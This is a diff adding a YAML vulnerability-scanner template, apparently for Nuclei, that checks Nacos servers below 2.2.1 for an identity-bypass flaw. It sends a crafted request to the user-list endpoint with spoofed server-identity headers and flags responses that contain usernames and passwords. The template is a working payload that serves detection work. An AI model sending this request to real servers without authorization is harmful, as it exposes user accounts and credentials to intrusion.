@@ -1,0 +1,29 @@
+id: nacos-identity-bypass
+ 
+info:
+  name: nacos-identity-bypass
+  author: SecurityArt
+  severity: high
+  tags: nacos
+# nacos < 2.2.1 默认
+http:
+  - raw:
+      - |              
+        GET /nacos/v1/auth/users?pageNo=1&pageSize=100&search=accurate&accessToken= HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0
+        Accept-Encoding: gzip, deflate 
+        Connection: close
+        nacos: nacos
+        serverIdentity: security
+        test: test
+        example: example
+        authKey: nacosSecurty
+        
+    matchers:
+      - type: word
+        words:
+          - "username"
+          - "password"
+          - "page"
+        condition: and
